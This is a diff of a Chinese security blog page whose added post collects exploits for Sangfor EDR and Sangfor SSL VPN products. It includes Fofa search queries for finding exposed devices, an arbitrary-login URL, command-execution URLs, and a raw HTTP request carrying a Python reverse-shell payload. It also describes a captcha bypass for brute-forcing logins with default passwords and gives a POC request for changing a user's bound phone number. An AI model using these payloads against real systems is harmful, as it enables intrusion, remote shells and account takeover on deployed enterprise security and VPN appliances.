@@ -6,34 +6,16 @@
   <meta name="keywords" content=" 深信服 , 应用 ">
   <meta name="description" content="深信服应用漏洞总结 | BigSwords">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="ThinkPHP 是一个快速、简单的基于 MVC 和面向对象的轻量级 PHP 开发框架，遵循 Apache2 开源协议发布。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重开发体验和易用性，为 WEB 应用和 API 开发提供了强有力的支持。 前言本篇文章将针对ThinkPHP的历史漏洞进行整理复现，今后爆出的ThinkPHP漏洞，也将进行补充更新。">
-<meta name="keywords" content="ThinkPHP,框架">
+<meta name="description" content="深信服 终端检测相应平台 (EDR)Fofa:语法 title&#x3D;“终端检测响应平台” 一，任意用户登录漏洞影响版本EDR&amp;lt;&#x3D;v3.2.19 漏洞复现payload: user&#x3D;任意 1https:&amp;#x2F;&amp;#x2F;XXX&amp;#x2F;ui&amp;#x2F;login.php?user&amp;#x3D;admin  ![](D:\Work\GitBlog\BigSwords’s Blog\public">
+<meta name="keywords" content="深信服,应用">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ThinkPHP漏洞总结">
-<meta property="og:url" content="https:&#x2F;&#x2F;bigswords.github.io&#x2F;2019&#x2F;12&#x2F;20&#x2F;4&#x2F;index.html">
+<meta property="og:title" content="深信服应用漏洞总结">
+<meta property="og:url" content="https:&#x2F;&#x2F;bigswords.github.io&#x2F;2020&#x2F;10&#x2F;09&#x2F;5&#x2F;index.html">
 <meta property="og:site_name" content="BigSwords">
-<meta property="og:description" content="ThinkPHP 是一个快速、简单的基于 MVC 和面向对象的轻量级 PHP 开发框架，遵循 Apache2 开源协议发布。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重开发体验和易用性，为 WEB 应用和 API 开发提供了强有力的支持。 前言本篇文章将针对ThinkPHP的历史漏洞进行整理复现，今后爆出的ThinkPHP漏洞，也将进行补充更新。">
+<meta property="og:description" content="深信服 终端检测相应平台 (EDR)Fofa:语法 title&#x3D;“终端检测响应平台” 一，任意用户登录漏洞影响版本EDR&amp;lt;&#x3D;v3.2.19 漏洞复现payload: user&#x3D;任意 1https:&amp;#x2F;&amp;#x2F;XXX&amp;#x2F;ui&amp;#x2F;login.php?user&amp;#x3D;admin  ![](D:\Work\GitBlog\BigSwords’s Blog\public">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;02b59cfc58d675df0a9e6a6504b4ecf4.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;9c57d647e53818df70f04dc7d339e8ff.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;de597a9131929fca7e8cd4c6cca44576.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;a4180480316757a4e222fb666b755f9e.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;87fe7fd2082ba68d27b7353f44e5aa87.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;813d568f9483ae9fbc84e83b17eeea81.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;2cfe2ea95acd80d4783a66dfcf2b097c.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;9fd040e70625857a925760814c5cfd88.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;47e943cd1acba4c95e82471c038eea80.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;50ff54ea3e1a44f4be2dfba634b82aaf.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;d1cc9e98eaec43f46e0f6b13113349f5.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;d53c716a02ce8753e3e1513915ad17fa.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;ea842a59a0b267116f44988731990116.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;a3625cb2e2543725301af1de996438c4.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;d48c037742188d28c9e2f29a0b788763.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;939d6f3e1692fbbf6c6cc00a6a427fe0.png">
-<meta property="og:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;d64a5375a5cd1a80f664f314ae7984aa.png">
-<meta property="og:updated_time" content="2019-12-23T11:16:10.000Z">
+<meta property="og:updated_time" content="2020-10-09T07:19:49.884Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http:&#x2F;&#x2F;zone.secevery.com&#x2F;uploads&#x2F;article&#x2F;20191220&#x2F;02b59cfc58d675df0a9e6a6504b4ecf4.png">
 
 
 <link rel="icon" href="/img/avatar.jpg">
@@ -160,6 +142,14 @@
     
         
             
+            <li><div data-rel="框架漏洞">框架漏洞<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
             <li><div data-rel="应用漏洞">应用漏洞<small>(1)</small></div>
                 
             </li>
@@ -169,14 +159,6 @@
         
             
             <li><div data-rel="CMS漏洞">CMS漏洞<small>(1)</small></div>
-                
-            </li>
-            
-        
-    
-        
-            
-            <li><div data-rel="框架漏洞">框架漏洞<small>(1)</small></div>
                 
             </li>
             
@@ -193,7 +175,7 @@
     <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
 </div>
 <input type="hidden" id="yelog_site_posts_number" value="4">
-<input type="hidden" id="yelog_site_word_count" value="4.8k">
+<input type="hidden" id="yelog_site_word_count" value="5.3k">
 <div style="display: none">
     <span id="busuanzi_value_site_uv"></span>
     <span id="busuanzi_value_site_pv"></span>
@@ -229,6 +211,14 @@
     <div class="tags-list">
     
     <li class="article-tag-list-item">
+        <a class="color4">ThinkPHP</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">框架</a>
+    </li>
+    
+    <li class="article-tag-list-item">
         <a class="color4">深信服</a>
     </li>
     
@@ -244,19 +234,27 @@
         <a class="color4">cms</a>
     </li>
     
-    <li class="article-tag-list-item">
-        <a class="color4">ThinkPHP</a>
-    </li>
-    
-    <li class="article-tag-list-item">
-        <a class="color3">框架</a>
-    </li>
-    
     <div class="clearfix"></div>
 </div>
 
     
     <nav id="title-list-nav">
+        
+        <a  class="框架漏洞 "
+           href="/2019/12/20/4/"
+           data-tag="ThinkPHP,框架"
+           data-author="" >
+            <span class="post-title" title="ThinkPHP漏洞总结">ThinkPHP漏洞总结</span>
+            <span class="post-date" title="2019-12-20 15:56:08">2019/12/20</span>
+        </a>
+        
+        <a  class=""
+           href="/2020/09/28/hello-world/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="文章发布">文章发布</span>
+            <span class="post-date" title="2020-09-28 22:10:22">2020/09/28</span>
+        </a>
         
         <a  class="应用漏洞 "
            href="/2020/10/09/5/"
@@ -272,22 +270,6 @@
            data-author="" >
             <span class="post-title" title="织梦内容管理系统(DedeCMS)漏洞集合">织梦内容管理系统(DedeCMS)漏洞集合</span>
             <span class="post-date" title="2019-12-05 14:58:23">2019/12/05</span>
-        </a>
-        
-        <a  class=""
-           href="/2020/09/28/hello-world/"
-           data-tag=""
-           data-author="" >
-            <span class="post-title" title="文章发布">文章发布</span>
-            <span class="post-date" title="2020-09-28 22:10:22">2020/09/28</span>
-        </a>
-        
-        <a  class="框架漏洞 "
-           href="/2019/12/20/4/"
-           data-tag="ThinkPHP,框架"
-           data-author="" >
-            <span class="post-title" title="ThinkPHP漏洞总结">ThinkPHP漏洞总结</span>
-            <span class="post-date" title="2019-12-20 15:56:08">2019/12/20</span>
         </a>
         
     </nav>
@@ -328,12 +310,12 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-10-09 11:23:44'>2020-10-09 11:04</time>
+        创建时间:<time class="date" title='更新时间: 2020-10-09 15:19:49'>2020-10-09 11:04</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:58</span>
+        <span>字数:594</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -363,7 +345,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#深信服-终端检测相应平台-EDR"><span class="toc-text">深信服 终端检测相应平台 (EDR)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一，任意用户登录漏洞"><span class="toc-text">一，任意用户登录漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二，任意命令执行（一）"><span class="toc-text">二，任意命令执行（一）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三，任意命令执行（二）"><span class="toc-text">三，任意命令执行（二）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#深信服-SSL-VPN-Pre-Auth"><span class="toc-text">深信服 SSL VPN - Pre Auth</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一，修改绑定手机"><span class="toc-text">一，修改绑定手机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二，任意密码重置"><span class="toc-text">二，任意密码重置</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#深信服-终端检测相应平台-EDR"><span class="toc-text">深信服 终端检测相应平台 (EDR)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一，任意用户登录漏洞"><span class="toc-text">一，任意用户登录漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#影响版本"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞复现"><span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二，任意命令执行（一）"><span class="toc-text">二，任意命令执行（一）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#影响版本-1"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞复现-1"><span class="toc-text">漏洞复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#深信服-SSL-VPN-Pre-Auth"><span class="toc-text">深信服 SSL VPN - Pre Auth</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#一，口令爆破"><span class="toc-text">一，口令爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二，任意密码重置"><span class="toc-text">二，任意密码重置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三，修改绑定手机"><span class="toc-text">三，修改绑定手机</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -379,7 +361,36 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="深信服-终端检测相应平台-EDR"><a href="#深信服-终端检测相应平台-EDR" class="headerlink" title="深信服 终端检测相应平台 (EDR)"></a>深信服 终端检测相应平台 (EDR)</h2><h3 id="一，任意用户登录漏洞"><a href="#一，任意用户登录漏洞" class="headerlink" title="一，任意用户登录漏洞"></a>一，任意用户登录漏洞</h3><h3 id="二，任意命令执行（一）"><a href="#二，任意命令执行（一）" class="headerlink" title="二，任意命令执行（一）"></a>二，任意命令执行（一）</h3><h3 id="三，任意命令执行（二）"><a href="#三，任意命令执行（二）" class="headerlink" title="三，任意命令执行（二）"></a>三，任意命令执行（二）</h3><h2 id="深信服-SSL-VPN-Pre-Auth"><a href="#深信服-SSL-VPN-Pre-Auth" class="headerlink" title="深信服 SSL VPN - Pre Auth"></a>深信服 SSL VPN - Pre Auth</h2><h3 id="一，修改绑定手机"><a href="#一，修改绑定手机" class="headerlink" title="一，修改绑定手机"></a>一，修改绑定手机</h3><h3 id="二，任意密码重置"><a href="#二，任意密码重置" class="headerlink" title="二，任意密码重置"></a>二，任意密码重置</h3>
+        <h2 id="深信服-终端检测相应平台-EDR"><a href="#深信服-终端检测相应平台-EDR" class="headerlink" title="深信服 终端检测相应平台 (EDR)"></a>深信服 终端检测相应平台 (EDR)</h2><p>Fofa:语法 title=“终端检测响应平台”</p>
+<h3 id="一，任意用户登录漏洞"><a href="#一，任意用户登录漏洞" class="headerlink" title="一，任意用户登录漏洞"></a>一，任意用户登录漏洞</h3><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>EDR&lt;=v3.2.19</p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>payload: user=任意</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;XXX&#x2F;ui&#x2F;login.php?user&#x3D;admin</span></pre></td></tr></table></figure>
+
+<p>![](D:\Work\GitBlog\BigSwords’s Blog\public\img\1.png)</p>
+<h3 id="二，任意命令执行（一）"><a href="#二，任意命令执行（一）" class="headerlink" title="二，任意命令执行（一）"></a>二，任意命令执行（一）</h3><h4 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h4><p>3.2.16</p>
+<p>3.2.17</p>
+<p>3.2.19</p>
+<h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.0-sec.org&#x2F;tool&#x2F;log&#x2F;c.php?strip_slashes&#x3D;system&amp;limit&#x3D;whoami</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.0-sec.org&#x2F;tool&#x2F;log&#x2F;c.php?strip_slashes&#x3D;system&amp;host&#x3D;whoami</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.0-sec.org&#x2F;tool&#x2F;log&#x2F;c.php?strip_slashes&#x3D;system&amp;path&#x3D;whoami</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.0-sec.org&#x2F;tool&#x2F;log&#x2F;c.php?strip_slashes&#x3D;system&amp;row&#x3D;whoami</span></pre></td></tr></table></figure>
+
+<p>![](D:\Work\GitBlog\BigSwords’s Blog\public\img\2.png)</p>
+<p>host参数命令执行</p>
+<p>反弹shell payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">POST &#x2F;tool&#x2F;log&#x2F;c.php HTTP&#x2F;1.1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">Host: xxx</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">Connection: close</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">Cache-Control: max-age&#x3D;0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">Upgrade-Insecure-Requests: 1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;72.0.3626.81 Safari&#x2F;537.36 SE 2.X MetaSr 1.0</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">DNT: 1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded;charset&#x3D;utf-8</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">Cookie: PHPSESSID&#x3D;b1464478cad68327229d8f46e60d0a08; _ga&#x3D;GA1.4.112365795.1597799903; _gid&#x3D;GA1.4.1225783590.1597799903</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">Content-Length: 256</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">strip_slashes&#x3D;system&amp;host&#x3D;python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;ip&quot;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39;</span></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="深信服-SSL-VPN-Pre-Auth"><a href="#深信服-SSL-VPN-Pre-Auth" class="headerlink" title="深信服 SSL VPN - Pre Auth"></a>深信服 SSL VPN - Pre Auth</h2><p>指纹:</p>
+<p>/por/login_auth.csp?apiversion=1sangfor/cgi-bin/login.cgi?rnd=</p>
+<p>Fofa:</p>
+<p>app=”深信服-SSL-VPN”</p>
+<h3 id="一，口令爆破"><a href="#一，口令爆破" class="headerlink" title="一，口令爆破"></a>一，口令爆破</h3><p>用户登录，若多次尝试登陆失败会要求输入验证码，若输入错误的验证码，会提示“校验码错误或校验码已过期”；修改登录请求的数据包，清空cookie和验证码字段的值即可绕过验证码，此时提示“用户名或密码错误”。</p>
+<p>加密的密码也就是 <code>sha1(password+sid)</code></p>
+<p>爆破也就锁一会ip, 夜里丢一边跑着就完事了, 弱口令也就那么些<code>admin/123456/Sangfor/Sangfor@123</code></p>
+<h3 id="二，任意密码重置"><a href="#二，任意密码重置" class="headerlink" title="二，任意密码重置"></a>二，任意密码重置</h3><h3 id="三，修改绑定手机"><a href="#三，修改绑定手机" class="headerlink" title="三，修改绑定手机"></a>三，修改绑定手机</h3><p>POC</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.0-sec.org&#x2F;por&#x2F;changetelnum.csp?apiversion&#x3D;1</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">post参数</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">newtel&#x3D;改的手机号&amp;sessReq&#x3D;clusterd&amp;username&#x3D;用户名&amp;grpid&#x3D;0&amp;sessid&#x3D;0&amp;ip&#x3D;127.0.0.1</span></pre></td></tr></table></figure>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1975763359@qq.com </span>
     </div>
@@ -393,10 +404,10 @@
 
 <div class="article_copyright">
     <p><span class="copy-title">文章标题:</span>深信服应用漏洞总结</p>
-    <p><span class="copy-title">文章字数:</span><span class="post-count">58</span></p>
+    <p><span class="copy-title">文章字数:</span><span class="post-count">594</span></p>
     <p><span class="copy-title">本文作者:</span><a  title="BigSwords">BigSwords</a></p>
     <p><span class="copy-title">发布时间:</span>2020-10-09, 11:04:08</p>
-    <p><span class="copy-title">最后更新:</span>2020-10-09, 11:23:44</p>
+    <p><span class="copy-title">最后更新:</span>2020-10-09, 15:19:49</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/10/09/5/" title="深信服应用漏洞总结">https://bigswords.github.io/2020/10/09/5/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
@@ -480,7 +491,7 @@
     /*作者、标签的自动补全*/
     $(function () {
         $('.search').AutoComplete({
-            'data': ['#深信服','#应用','#dede','#cms','#ThinkPHP','#框架',],
+            'data': ['#ThinkPHP','#框架','#深信服','#应用','#dede','#cms',],
             'itemHeight': 20,
             'width': 418
         }).AutoComplete('show');
